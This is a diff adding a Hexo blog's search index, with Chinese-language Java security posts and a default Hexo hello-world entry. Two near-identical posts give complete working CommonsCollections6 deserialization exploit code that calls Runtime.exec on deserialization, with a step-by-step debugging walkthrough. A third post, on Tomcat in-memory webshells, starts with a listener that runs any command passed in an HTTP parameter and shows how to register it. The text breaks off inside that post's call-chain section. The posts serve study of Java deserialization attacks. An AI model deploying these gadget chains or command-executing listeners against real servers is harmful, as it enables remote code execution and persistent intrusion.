@@ -1,0 +1,1225 @@
+<?xml version="1.0" encoding="utf-8"?>
+<search>
+  <entry>
+    <title>CommonsCollections6</title>
+    <url>/2023/08/21/10%E3%80%81CommonsCollections6/</url>
+    <content><![CDATA[<a name="QkBSR"></a>
+# 利用版本
+jdk8（这里用的jdk8u201） && Commons-Collections 3.1-3.2.1
+<a name="QDlpN"></a>
+# CommonsCollections6 Demo
+```java
+import org.apache.commons.collections.Transformer;
+import org.apache.commons.collections.functors.ChainedTransformer;
+import org.apache.commons.collections.functors.ConstantTransformer;
+import org.apache.commons.collections.functors.InvokerTransformer;
+import org.apache.commons.collections.keyvalue.TiedMapEntry;
+import org.apache.commons.collections.map.LazyMap;
+
+import java.io.*;
+import java.lang.reflect.Field;
+import java.util.HashMap;
+import java.util.Map;
+
+public class CommonsCollections6 {
+
+    public static void main(String[] args) throws NoSuchFieldException, IllegalAccessException, IOException, ClassNotFoundException {
+
+        Transformer[] fakeTransformer = new Transformer[]{};
+
+        Transformer[] transformers = new Transformer[] {
+                new ConstantTransformer(Runtime.class),
+                new InvokerTransformer("getMethod", new Class[]{String.class, Class[].class}, new Object[]{"getRuntime", new Class[0]}),
+                new InvokerTransformer("invoke", new Class[]{Object.class, Object[].class}, new Object[]{null, new Object[0]}),
+                new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{"calc"})
+        };
+
+        //ChainedTransformer实例
+        //先设置假的 Transformer 数组，防止生成时执行命令
+        Transformer chainedTransformer = new ChainedTransformer(fakeTransformer);
+
+        //LazyMap实例
+        Map uselessMap = new HashMap();
+        Map lazyMap = LazyMap.decorate(uselessMap,chainedTransformer);
+
+        //TiedMapEntry 实例
+        TiedMapEntry tiedMapEntry = new TiedMapEntry(lazyMap,"test");
+
+        HashMap hashMap = new HashMap();
+        hashMap.put(tiedMapEntry, "test");
+
+
+        //通过反射设置真的 ransformer 数组
+        Field field = chainedTransformer.getClass().getDeclaredField("iTransformers");
+        field.setAccessible(true);
+        field.set(chainedTransformer, transformers);
+        //清空由于 hashMap.put 对 LazyMap 造成的影响
+        lazyMap.clear();
+
+        //序列化
+        ByteArrayOutputStream baos = new ByteArrayOutputStream();
+        ObjectOutputStream oos = new ObjectOutputStream(baos);
+        oos.writeObject(hashMap);
+        oos.flush();
+        oos.close();
+
+        //测试反序列化
+        ByteArrayInputStream bais = new ByteArrayInputStream(baos.toByteArray());
+        ObjectInputStream ois = new ObjectInputStream(bais);
+        ois.readObject();
+        ois.close();
+
+    }
+
+}
+```
+<a name="l5hI5"></a>
+# 分析
+看demo，其实和CC5差不多，不同就是序列化的对象不一样<br />![image.png](https://cdn.nlark.com/yuque/0/2023/png/29085579/1692371747061-ca550b9d-864a-4b7c-a24f-593a188d6295.png#averageHue=%232e2c2b&clientId=udb43fc85-20f2-4&from=paste&height=489&id=u29612b4e&originHeight=734&originWidth=1182&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=110393&status=done&style=none&taskId=u54813c6f-ac11-4c54-b08b-35ba72e72f5&title=&width=788)<br />![image.png](https://cdn.nlark.com/yuque/0/2023/png/29085579/1692371798668-d827a12b-d0d8-4902-8124-e7a3992c6b1f.png#averageHue=%232d2c2b&clientId=udb43fc85-20f2-4&from=paste&height=424&id=uf1c66c5c&originHeight=636&originWidth=1217&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=98937&status=done&style=none&taskId=u93ed2bbb-d66a-41ce-8728-935cd818831&title=&width=811.3333333333334)<br />相同的是都将LazyMap封装到了TiedMapEntry对象<br />![image.png](https://cdn.nlark.com/yuque/0/2023/png/29085579/1692371893989-69da0adc-d7db-44cd-a9c3-75962a7db8de.png#averageHue=%232e2c2b&clientId=udb43fc85-20f2-4&from=paste&height=403&id=u842b2c74&originHeight=605&originWidth=1167&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=95502&status=done&style=none&taskId=u5a3a2209-cd2b-445f-a473-4f7ecbedbd7&title=&width=778)<br />![image.png](https://cdn.nlark.com/yuque/0/2023/png/29085579/1692371941700-a41b2a1f-8cc5-4016-9b92-982430909a1f.png#averageHue=%232e2c2b&clientId=udb43fc85-20f2-4&from=paste&height=413&id=u3031305b&originHeight=620&originWidth=1215&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=99078&status=done&style=none&taskId=u26677b4a-45af-4627-b848-0e43427a4ca&title=&width=810)<br />在CC5的分析文章中分析说到，要触发LazyMap.get()方法，TiedMapEntry有三个方法都可以触发<br />![image.png](https://cdn.nlark.com/yuque/0/2023/png/29085579/1692345568399-529eb6af-85d5-4b1c-940b-24221914708c.png#averageHue=%232d2c2b&clientId=ucdd93d7d-63ad-4&from=paste&height=88&id=u1a1bfbf4&originHeight=132&originWidth=1194&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=15976&status=done&style=none&taskId=ua8a45348-239d-4e44-b247-90784edd54b&title=&width=796)<br />![image.png](https://cdn.nlark.com/yuque/0/2023/png/29085579/1692345588936-1b588e28-c0b2-4c1d-bc30-389e9289532a.png#averageHue=%232e2c2b&clientId=ucdd93d7d-63ad-4&from=paste&height=453&id=u3aaf0a1d&originHeight=680&originWidth=1172&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=79264&status=done&style=none&taskId=ub34785ff-e7ea-485f-bd5f-0e8b1687b32&title=&width=781.3333333333334)<br />其中hashCode()方法法跟序列化的HashMap对象有关系，我们跟进HashMap.readObject()方法<br />![image.png](https://cdn.nlark.com/yuque/0/2023/png/29085579/1692345738066-540692a9-0df9-4591-be90-ef76255ba7b7.png#averageHue=%232d2c2c&clientId=ucdd93d7d-63ad-4&from=paste&height=405&id=u8bf2138e&originHeight=608&originWidth=1110&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=77588&status=done&style=none&taskId=ucf2594db-d465-4984-ab84-cdd63101e41&title=&width=740)<br />跟进hash()<br />![image.png](https://cdn.nlark.com/yuque/0/2023/png/29085579/1692345766629-aef7e5a4-23db-4b2a-802f-b7f6eb99f12f.png#averageHue=%23302d2c&clientId=ucdd93d7d-63ad-4&from=paste&height=107&id=u95e65570&originHeight=161&originWidth=1106&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=20408&status=done&style=none&taskId=u45eb0c9f-9f45-49f8-b19f-667b1b98f3b&title=&width=737.3333333333334)<br />可以看到，在hash()方法中，会调用key.hashCode()<br />回到demo中，可以看到HashMap对象传入的key是一个TiedMapEntry对象，所以反序列化HashMap对象的时候，就会调用TiedMapEntry.hashCode()方法，进而触发LazyMap.get()方法<br />![image.png](https://cdn.nlark.com/yuque/0/2023/png/29085579/1692345846305-af94b334-c6bb-41d4-8a58-89d7fad36d4f.png#averageHue=%232f2e2c&clientId=ucdd93d7d-63ad-4&from=paste&height=246&id=u041c35f9&originHeight=369&originWidth=1059&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=49497&status=done&style=none&taskId=u955b1cfa-1e40-4a78-910e-f494fb69a44&title=&width=706)<br />只要调用了LazyMap.get()，就可以触发ChainedTransformer.transform()，进而对transformers数组进行回调，最后执行命令<br />但是，调用HashMap.put()方法的时候，也会调用hashCode()方法，这样的话还序列化就直接执行命令了<br />![image.png](https://cdn.nlark.com/yuque/0/2023/png/29085579/1692352340872-0bec8177-ea0f-4517-9a26-3876b3b168b9.png#averageHue=%232f2d2c&clientId=ucdd93d7d-63ad-4&from=paste&height=144&id=u553bdb29&originHeight=216&originWidth=1130&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=26726&status=done&style=none&taskId=ue919e3d0-1c7e-4b56-84f2-e32de321431&title=&width=753.3333333333334)<br />![image.png](https://cdn.nlark.com/yuque/0/2023/png/29085579/1692352356772-7942aef7-463d-4cd1-af5a-7a5ce66a410c.png#averageHue=%232f2d2c&clientId=ucdd93d7d-63ad-4&from=paste&height=127&id=u348164d4&originHeight=191&originWidth=1113&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=21468&status=done&style=none&taskId=ue9376484-301a-45e8-b3ac-403b3f0b62f&title=&width=742)<br />这样不符合预期，我们需要在反序列化的时候才能触发命令执行，所以代码需要修改一下<br />如下图所示，另外写一个Transformer数组对象fackTransformers，并且封装到ChainedTransformer对象中，这样在调用HashMap.put()方法的时候就不会触发我们的命令执行了<br />![image.png](https://cdn.nlark.com/yuque/0/2023/png/29085579/1692352509641-8016f63b-003e-47b4-b58e-7aee23498b58.png#averageHue=%232f2d2c&clientId=ucdd93d7d-63ad-4&from=paste&height=733&id=u9418ec22&originHeight=1100&originWidth=1202&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=142786&status=done&style=none&taskId=u24cae9c8-5909-4c1f-ba77-af0e70d0903&title=&width=801.3333333333334)<br />然后在调用完HashMap.put()方法后，我们需要将能执行命令的Transformer数组对象给封装到ChainedTransformer对象中，这里可以用反射进行更改<br />![image.png](https://cdn.nlark.com/yuque/0/2023/png/29085579/1692352975459-60d84f3b-8c5e-4349-b406-9ddd2b6a8c09.png#averageHue=%232f2c2b&clientId=ucdd93d7d-63ad-4&from=paste&height=376&id=ufb43bdd4&originHeight=564&originWidth=1241&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=84013&status=done&style=none&taskId=u4f0e373f-d88e-4ea9-8ac8-83704afe876&title=&width=827.3333333333334)<br />但是，还有一个需要改的地方，我们跟进LazyMap.get()方法<br />![image.png](https://cdn.nlark.com/yuque/0/2023/png/29085579/1692356003648-05b18860-e019-4f9a-a23a-a5535b0eabef.png#averageHue=%232c2c2c&clientId=ucdd93d7d-63ad-4&from=paste&height=231&id=u1e5fe1f9&originHeight=347&originWidth=1239&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=38791&status=done&style=none&taskId=u2f9d6a2c-41e9-4217-8e44-333b7e2ec79&title=&width=826)<br />在调用HashMap.put的时候，成员变量map会被赋值，这里打个断点调试一下<br />![image.png](https://cdn.nlark.com/yuque/0/2023/png/29085579/1692356078271-def339b9-26b7-42c7-bac9-1cfaeebc806b.png#averageHue=%23687e5f&clientId=ucdd93d7d-63ad-4&from=paste&height=701&id=u9df9b627&originHeight=1052&originWidth=1091&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=107091&status=done&style=none&taskId=uf8aa12a8-90e9-4245-b258-5422fff94f0&title=&width=727.3333333333334)<br />如上图所示，因为map在调用HashMap.put的时候并没有赋值，所以进入第58行if的时候，值为false，顺利进入158行的代码逻辑，调用map.put()方法，给map赋值，key和value都是“test”<br />继续调试，在进入反序列化的时候再次回到了LazyMap.get()方法<br />![image.png](https://cdn.nlark.com/yuque/0/2023/png/29085579/1692356167823-6469c65f-5615-4886-87d5-6c09f099593a.png#averageHue=%23777e6a&clientId=ucdd93d7d-63ad-4&from=paste&height=552&id=uec88986e&originHeight=828&originWidth=1056&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=92354&status=done&style=none&taskId=ud5da9858-bf13-4688-bb41-d62e5450719&title=&width=704)<br />调试结果如上图所示，此时传入的key是“test”，而map的key也是“test”（第一次进入LazyMap.get()时候赋值），所以在156行的if语句中，map.containsKey(key)的结果是true，所以就直接进入63行的代码，而没有进入if里面触发157行factory.transform()方法<br />要想进入if里面，就得将map的key给去掉，我们跟进map<br />![image.png](https://cdn.nlark.com/yuque/0/2023/png/29085579/1692371076734-31214457-adec-4cec-8d06-46e576a2ad07.png#averageHue=%232f2b2b&clientId=uec5ef244-1376-4&from=paste&height=224&id=u87406918&originHeight=336&originWidth=1085&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=47317&status=done&style=none&taskId=u8c2bc7af-05ec-4a97-b93b-0cd48a66801&title=&width=723.3333333333334)<br />![image.png](https://cdn.nlark.com/yuque/0/2023/png/29085579/1692371097454-7dcffae6-bfb4-479c-950d-38ae194a048e.png#averageHue=%232f2c2b&clientId=uec5ef244-1376-4&from=paste&height=292&id=u571783ab&originHeight=438&originWidth=1107&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=36030&status=done&style=none&taskId=u8fed9984-26a5-4c7f-8553-09f9ad6bc87&title=&width=738)<br />可以发现，map来自LazyMap的父类AbstractMapDecorator成员变量map，是个Map对象<br />所以可以通过Map.clear()或者Map.remove("test");<br />![image.png](https://cdn.nlark.com/yuque/0/2023/png/29085579/1692371568063-5ab9a7a3-5a5d-40d0-844f-399ddef8facc.png#averageHue=%23302d2c&clientId=uec5ef244-1376-4&from=paste&height=391&id=ua4c502cd&originHeight=587&originWidth=1290&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=109090&status=done&style=none&taskId=u5f4366d1-ab77-4a92-9467-eefcc045c89&title=&width=860)<br />运行<br />![image.png](https://cdn.nlark.com/yuque/0/2023/png/29085579/1692371592485-d24f274f-c929-4ff6-906c-c4ae67a8032c.png#averageHue=%2399917e&clientId=uec5ef244-1376-4&from=paste&height=304&id=u7b8b3f77&originHeight=456&originWidth=1190&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=103583&status=done&style=none&taskId=u2e8eb695-2dec-4ff0-b661-ca3ccc4c60e&title=&width=793.3333333333334)<br />![image.png](https://cdn.nlark.com/yuque/0/2023/png/29085579/1692371469600-1ad63aba-3463-4044-8ab4-918b4b5e5a12.png#averageHue=%23dce0d7&clientId=uec5ef244-1376-4&from=paste&height=334&id=udefb8672&originHeight=501&originWidth=1140&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=108195&status=done&style=none&taskId=u905774b2-f588-4021-a7eb-4e0202be38e&title=&width=760)<br />成功弹出计算器
+<a name="PbFGq"></a>
+# 完整代码
+```java
+import org.apache.commons.collections.Transformer;
+import org.apache.commons.collections.functors.ChainedTransformer;
+import org.apache.commons.collections.functors.ConstantTransformer;
+import org.apache.commons.collections.functors.InvokerTransformer;
+import org.apache.commons.collections.keyvalue.TiedMapEntry;
+import org.apache.commons.collections.map.LazyMap;
+
+import javax.management.BadAttributeValueExpException;
+import java.io.*;
+import java.lang.reflect.Field;
+import java.lang.reflect.InvocationTargetException;
+import java.lang.reflect.Method;
+import java.util.HashMap;
+import java.util.Map;
+
+public class CommonsCollections6 {
+
+    public static void main(String[] args) throws NoSuchFieldException, IllegalAccessException, IOException, ClassNotFoundException, NoSuchMethodException, InvocationTargetException {
+
+        //Transformer数组对象
+        Transformer[] transformers = new Transformer[] {
+                new ConstantTransformer(Runtime.class),
+                new InvokerTransformer("getMethod", new Class[]{String.class, Class[].class}, new Object[]{"getRuntime", new Class[0]}),
+                new InvokerTransformer("invoke", new Class[]{Object.class, Object[].class}, new Object[]{null, new Object[0]}),
+                new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{"calc"})
+        };
+
+        //弄一个不能执行命令的Transformer数组对象，这样在HashMap.put()的时候就不会执行命令
+        Transformer[] fackTransformers =  new Transformer[]{};
+
+        //ChainedTransformer实例
+        Transformer chainedTransformer = new ChainedTransformer(fackTransformers);
+
+        //LazyMap实例
+        Map uselessMap = new HashMap();
+        Map lazyMap = LazyMap.decorate(uselessMap,chainedTransformer);
+
+        //TiedMapEntry 实例
+        TiedMapEntry tiedMapEntry = new TiedMapEntry(lazyMap,"test");
+
+        //new一个HashMap对象
+        Map map = new HashMap();
+        map.put(tiedMapEntry, "aaa");
+
+        //获取LazyMap父类中的map成员变量
+        Field field1 = lazyMap.getClass().getSuperclass().getDeclaredField("map");
+        field1.setAccessible(true);
+        Map map1 = (Map) field1.get(lazyMap);
+        //将map的键对清空，即可进入if后面的代码逻辑
+        //map1.clear();
+        map1.remove("test");
+
+        //获取ChainedTransformer对象中的成员变量iTransformers
+        Field field = chainedTransformer.getClass().getDeclaredField("iTransformers");
+        field.setAccessible(true);
+        //将能执行命令的Transformer数组对象给赋值给成员变量iTransformers
+        field.set(chainedTransformer, transformers);
+
+
+        //序列化
+        FileOutputStream fileOutputStream = new FileOutputStream("C:\\Users\\18249\\Desktop\\bypass\\xlh\\aa1223.ser");
+        ObjectOutputStream xlh = new ObjectOutputStream(fileOutputStream);
+        xlh.writeObject(map);
+        xlh.close();
+        fileOutputStream.close();
+
+        //反序列化
+        FileInputStream fileInputStream = new FileInputStream("C:\\Users\\18249\\Desktop\\bypass\\xlh\\aa1223.ser");
+        ObjectInputStream fxlh = new ObjectInputStream(fileInputStream);
+        fxlh.readObject();
+        fxlh.close();
+
+    }
+
+}
+```
+]]></content>
+      <tags>
+        <tag>java安全</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>CC6</title>
+    <url>/2023/08/21/CC6/</url>
+    <content><![CDATA[
+# 利用版本
+jdk8（这里用的jdk8u201） && Commons-Collections 3.1-3.2.1
+# CommonsCollections6 Demo
+```
+import org.apache.commons.collections.Transformer;
+import org.apache.commons.collections.functors.ChainedTransformer;
+import org.apache.commons.collections.functors.ConstantTransformer;
+import org.apache.commons.collections.functors.InvokerTransformer;
+import org.apache.commons.collections.keyvalue.TiedMapEntry;
+import org.apache.commons.collections.map.LazyMap;
+
+import java.io.*;
+import java.lang.reflect.Field;
+import java.util.HashMap;
+import java.util.Map;
+
+public class CommonsCollections6 {
+
+    public static void main(String[] args) throws NoSuchFieldException, IllegalAccessException, IOException, ClassNotFoundException {
+
+        Transformer[] fakeTransformer = new Transformer[]{};
+
+        Transformer[] transformers = new Transformer[] {
+                new ConstantTransformer(Runtime.class),
+                new InvokerTransformer("getMethod", new Class[]{String.class, Class[].class}, new Object[]{"getRuntime", new Class[0]}),
+                new InvokerTransformer("invoke", new Class[]{Object.class, Object[].class}, new Object[]{null, new Object[0]}),
+                new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{"calc"})
+        };
+
+        //ChainedTransformer实例
+        //先设置假的 Transformer 数组，防止生成时执行命令
+        Transformer chainedTransformer = new ChainedTransformer(fakeTransformer);
+
+        //LazyMap实例
+        Map uselessMap = new HashMap();
+        Map lazyMap = LazyMap.decorate(uselessMap,chainedTransformer);
+
+        //TiedMapEntry 实例
+        TiedMapEntry tiedMapEntry = new TiedMapEntry(lazyMap,"test");
+
+        HashMap hashMap = new HashMap();
+        hashMap.put(tiedMapEntry, "test");
+
+
+        //通过反射设置真的 ransformer 数组
+        Field field = chainedTransformer.getClass().getDeclaredField("iTransformers");
+        field.setAccessible(true);
+        field.set(chainedTransformer, transformers);
+        //清空由于 hashMap.put 对 LazyMap 造成的影响
+        lazyMap.clear();
+
+        //序列化
+        ByteArrayOutputStream baos = new ByteArrayOutputStream();
+        ObjectOutputStream oos = new ObjectOutputStream(baos);
+        oos.writeObject(hashMap);
+        oos.flush();
+        oos.close();
+
+        //测试反序列化
+        ByteArrayInputStream bais = new ByteArrayInputStream(baos.toByteArray());
+        ObjectInputStream ois = new ObjectInputStream(bais);
+        ois.readObject();
+        ois.close();
+
+    }
+
+}
+```
+# 分析
+看demo，其实和CC5差不多，不同就是序列化的对象不一样
+![](https://s3.hedgedoc.org/demo/uploads/58d3160d-9f44-4cea-ad53-2dae2fc47abc.png)
+
+![](https://s3.hedgedoc.org/demo/uploads/d9f2220f-6a5f-47d9-a0a1-4c5168ca9a52.png)
+相同的是都将LazyMap封装到了TiedMapEntry对象
+![](https://s3.hedgedoc.org/demo/uploads/c76b4d92-e253-47b2-973b-294b726b561c.png)
+
+![](https://s3.hedgedoc.org/demo/uploads/a2eb8f23-83b5-414f-a11c-65257fb671ea.png)
+在CC5的分析文章中分析说到，要触发LazyMap.get()方法，TiedMapEntry有三个方法都可以触发
+![](https://s3.hedgedoc.org/demo/uploads/4076f6e7-23eb-4168-bbeb-875754346a22.png)
+
+![](https://s3.hedgedoc.org/demo/uploads/f5017af3-8a42-4b8b-873b-d5c81573041c.png)
+其中hashCode()方法法跟序列化的HashMap对象有关系，我们跟进HashMap.readObject()方法
+![](https://s3.hedgedoc.org/demo/uploads/1c59b69c-5f1e-4dea-b28d-b7dd009e879f.png)
+跟进hash()
+![](https://s3.hedgedoc.org/demo/uploads/daa99de6-09b6-4859-90aa-d43e97383cd3.png)
+可以看到，在hash()方法中，会调用key.hashCode()
+回到demo中，可以看到HashMap对象传入的key是一个TiedMapEntry对象，所以反序列化HashMap对象的时候，就会调用TiedMapEntry.hashCode()方法，进而触发LazyMap.get()方法
+![](https://s3.hedgedoc.org/demo/uploads/e20e16b4-4fb7-451e-b775-c99b5ee0346c.png)
+只要调用了LazyMap.get()，就可以触发ChainedTransformer.transform()，进而对transformers数组进行回调，最后执行命令
+但是，调用HashMap.put()方法的时候，也会调用hashCode()方法，这样的话还序列化就直接执行命令了
+![](https://s3.hedgedoc.org/demo/uploads/cf134d55-d0cf-45aa-b58a-f59103e54ecc.png)
+
+![](https://s3.hedgedoc.org/demo/uploads/f73ab60f-fd75-456b-986a-18f0d2aa253f.png)
+这样不符合预期，我们需要在反序列化的时候才能触发命令执行，所以代码需要修改一下
+如下图所示，另外写一个Transformer数组对象fackTransformers，并且封装到ChainedTransformer对象中，这样在调用HashMap.put()方法的时候就不会触发我们的命令执行了
+![](https://s3.hedgedoc.org/demo/uploads/b8389dc1-0a04-443f-a7b5-f42cea439085.png)
+然后在调用完HashMap.put()方法后，我们需要将能执行命令的Transformer数组对象给封装到ChainedTransformer对象中，这里可以用反射进行更改
+![](https://s3.hedgedoc.org/demo/uploads/e2a0aa91-c413-497d-9ed0-62baf19044f9.png)
+但是，还有一个需要改的地方，我们跟进LazyMap.get()方法
+![](https://s3.hedgedoc.org/demo/uploads/9bdd6e7d-bf8a-47c7-ae50-9d6f2038cfa1.png)
+
+在调用HashMap.put的时候，成员变量map会被赋值，这里打个断点调试一下
+![](https://s3.hedgedoc.org/demo/uploads/1fa9f110-628f-4a4b-be8f-632a8a631040.png)
+
+如上图所示，因为map在调用HashMap.put的时候并没有赋值，所以进入第58行if的时候，值为false，顺利进入158行的代码逻辑，调用map.put()方法，给map赋值，key和value都是“test”
+继续调试，在进入反序列化的时候再次回到了LazyMap.get()方法
+![](https://s3.hedgedoc.org/demo/uploads/f8e163e0-8682-4b83-af47-69d0cbad7640.png)
+
+调试结果如上图所示，此时传入的key是“test”，而map的key也是“test”（第一次进入LazyMap.get()时候赋值），所以在156行的if语句中，map.containsKey(key)的结果是true，所以就直接进入63行的代码，而没有进入if里面触发157行factory.transform()方法
+要想进入if里面，就得将map的key给去掉，我们跟进map
+![](https://s3.hedgedoc.org/demo/uploads/493d431f-eb8c-4225-a693-046ea757e4a4.png)
+
+![](https://s3.hedgedoc.org/demo/uploads/da99f6dc-ec3a-4c48-8558-ce1c148d91ad.png)
+
+可以发现，map来自LazyMap的父类AbstractMapDecorator成员变量map，是个Map对象
+所以可以通过Map.clear()或者Map.remove("test");
+![](https://s3.hedgedoc.org/demo/uploads/d567159c-78eb-484a-9546-2112ad588432.png)
+
+运行
+![](https://s3.hedgedoc.org/demo/uploads/34e7c11f-8bcb-4ea6-b7b9-690778cde191.png)
+
+![](https://s3.hedgedoc.org/demo/uploads/c53d4942-6e8d-4b6e-859f-593fbe634020.png)
+
+成功弹出计算器
+# 完整代码
+```
+import org.apache.commons.collections.Transformer;
+import org.apache.commons.collections.functors.ChainedTransformer;
+import org.apache.commons.collections.functors.ConstantTransformer;
+import org.apache.commons.collections.functors.InvokerTransformer;
+import org.apache.commons.collections.keyvalue.TiedMapEntry;
+import org.apache.commons.collections.map.LazyMap;
+
+import javax.management.BadAttributeValueExpException;
+import java.io.*;
+import java.lang.reflect.Field;
+import java.lang.reflect.InvocationTargetException;
+import java.lang.reflect.Method;
+import java.util.HashMap;
+import java.util.Map;
+
+public class CommonsCollections6 {
+
+    public static void main(String[] args) throws NoSuchFieldException, IllegalAccessException, IOException, ClassNotFoundException, NoSuchMethodException, InvocationTargetException {
+
+        //Transformer数组对象
+        Transformer[] transformers = new Transformer[] {
+                new ConstantTransformer(Runtime.class),
+                new InvokerTransformer("getMethod", new Class[]{String.class, Class[].class}, new Object[]{"getRuntime", new Class[0]}),
+                new InvokerTransformer("invoke", new Class[]{Object.class, Object[].class}, new Object[]{null, new Object[0]}),
+                new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{"calc"})
+        };
+
+        //弄一个不能执行命令的Transformer数组对象，这样在HashMap.put()的时候就不会执行命令
+        Transformer[] fackTransformers =  new Transformer[]{};
+
+        //ChainedTransformer实例
+        Transformer chainedTransformer = new ChainedTransformer(fackTransformers);
+
+        //LazyMap实例
+        Map uselessMap = new HashMap();
+        Map lazyMap = LazyMap.decorate(uselessMap,chainedTransformer);
+
+        //TiedMapEntry 实例
+        TiedMapEntry tiedMapEntry = new TiedMapEntry(lazyMap,"test");
+
+        //new一个HashMap对象
+        Map map = new HashMap();
+        map.put(tiedMapEntry, "aaa");
+
+        //获取LazyMap父类中的map成员变量
+        Field field1 = lazyMap.getClass().getSuperclass().getDeclaredField("map");
+        field1.setAccessible(true);
+        Map map1 = (Map) field1.get(lazyMap);
+        //将map的键对清空，即可进入if后面的代码逻辑
+        //map1.clear();
+        map1.remove("test");
+
+        //获取ChainedTransformer对象中的成员变量iTransformers
+        Field field = chainedTransformer.getClass().getDeclaredField("iTransformers");
+        field.setAccessible(true);
+        //将能执行命令的Transformer数组对象给赋值给成员变量iTransformers
+        field.set(chainedTransformer, transformers);
+
+
+        //序列化
+        FileOutputStream fileOutputStream = new FileOutputStream("C:\\Users\\18249\\Desktop\\bypass\\xlh\\aa1223.ser");
+        ObjectOutputStream xlh = new ObjectOutputStream(fileOutputStream);
+        xlh.writeObject(map);
+        xlh.close();
+        fileOutputStream.close();
+
+        //反序列化
+        FileInputStream fileInputStream = new FileInputStream("C:\\Users\\18249\\Desktop\\bypass\\xlh\\aa1223.ser");
+        ObjectInputStream fxlh = new ObjectInputStream(fileInputStream);
+        fxlh.readObject();
+        fxlh.close();
+
+    }
+
+}
+```
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+]]></content>
+      <tags>
+        <tag>java安全</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Hello World</title>
+    <url>/2023/08/21/hello-world/</url>
+    <content><![CDATA[Welcome to [Hexo](https://hexo.io/)! This is your very first post. Check [documentation](https://hexo.io/docs/) for more info. If you get any problems when using Hexo, you can find the answer in [troubleshooting](https://hexo.io/docs/troubleshooting.html) or you can ask me on [GitHub](https://github.com/hexojs/hexo/issues).
+
+## Quick Start
+
+### Create a new post
+
+``` bash
+$ hexo new "My New Post"
+```
+
+More info: [Writing](https://hexo.io/docs/writing.html)
+
+### Run server
+
+``` bash
+$ hexo server
+```
+
+More info: [Server](https://hexo.io/docs/server.html)
+
+### Generate static files
+
+``` bash
+$ hexo generate
+```
+
+More info: [Generating](https://hexo.io/docs/generating.html)
+
+### Deploy to remote sites
+
+``` bash
+$ hexo deploy
+```
+
+More info: [Deployment](https://hexo.io/docs/one-command-deployment.html)
+]]></content>
+      <tags>
+        <tag>测试</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>lantest</title>
+    <url>/2023/08/21/lantest/</url>
+    <content><![CDATA[]]></content>
+  </entry>
+  <entry>
+    <title>tomcat 内存马</title>
+    <url>/2023/08/21/%E6%97%A0%E6%A0%87%E9%A2%98Markdown/</url>
+    <content><![CDATA[
+# 1、前言
+
+Tomcat一般有三种，分为Listener、Filter、Servlet
+
+Listener、Filter只是Servlet的一种扩展机制，在web.xml中配置，在Context容器中进行管理的，而Context容器在初始化的时候，都会有一个ContextConfig对象，这个对象主要就是用来初始化获取关于Context的配置，其中就包括了Listener、Filter、Servlet的配置
+
+学点前置知识，真的很不错：<https://blog.csdn.net/weixin_41835612/article/details/111401693?spm=1001.2014.3001.5502>
+
+加载三个Java Web组件的加载顺序是Listen>Filter>Servlet，体现在StandardContext.startInternal()方法中
+
+![](https://cdn.nlark.com/yuque/0/2023/png/29085579/1690657796609-40d7a73d-0395-4f89-a770-ebc7411073c4.png)
+
+![](https://cdn.nlark.com/yuque/0/2023/png/29085579/1690657816195-bdf76d97-ade5-4739-b6f8-e643a131f2dc.png)
+
+![](https://cdn.nlark.com/yuque/0/2023/png/29085579/1690657831735-d1f4684b-cfbd-4344-a050-6525f17177f6.png)
+
+# 2、Listener内存马
+
+## 2.1、简述
+
+这里首先讲Listener内存马，因为在 Java Web 应用程序中，Listener 没有路径映射表的概念，只需要添加到Listener集合中即可，比较简单
+
+而在所有的Listener类型中，监听Servlet请求的ServletRequestListener 监听器是需要监听所有的请求的，也就是说，只要有请求，都会触发ServletRequestListener.requestInitialized()方法
+
+所以ServletRequestListener类型的监听器做内存马最适合不过
+
+## 2.2、编写一个Listener
+
+首先写一个Listener，然后在web.xml中配置
+
+```java
+package com.tomcatd0.listener;
+
+import javax.servlet.ServletRequestEvent;
+import javax.servlet.ServletRequestListener;
+import javax.servlet.http.HttpServletRequest;
+import java.io.IOException;
+
+public class MyListener implements ServletRequestListener {
+
+    @Override
+    public void requestInitialized(ServletRequestEvent sre) {
+        HttpServletRequest request = (HttpServletRequest) sre.getServletRequest();
+        String commad = request.getParameter("listener_cmd");
+        if(commad != null) {
+            try {
+                Runtime.getRuntime().exec(commad);
+            } catch (IOException e) {
+                throw new RuntimeException(e);
+            }
+        }
+    }
+    @Override
+    public void requestDestroyed(ServletRequestEvent sre) {
+    }
+}
+
+```
+
+```java
+<?xml version="1.0" encoding="UTF-8"?>
+<web-app xmlns="http://xmlns.jcp.org/xml/ns/javaee"
+         xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
+         xsi:schemaLocation="http://xmlns.jcp.org/xml/ns/javaee http://xmlns.jcp.org/xml/ns/javaee/web-app_4_0.xsd"
+         version="4.0">
+    
+    <listener>
+        <listener-class>com.tomcatd0.listener.MyListener</listener-class>
+    </listener>
+    
+</web-app>
+```
+
+![](https://cdn.nlark.com/yuque/0/2023/png/29085579/1690526565684-03b132f4-8934-4d33-b8eb-3b48c1867f51.png)
+
+成功弹出计算器
+
+## 2.3、调用链分析
+
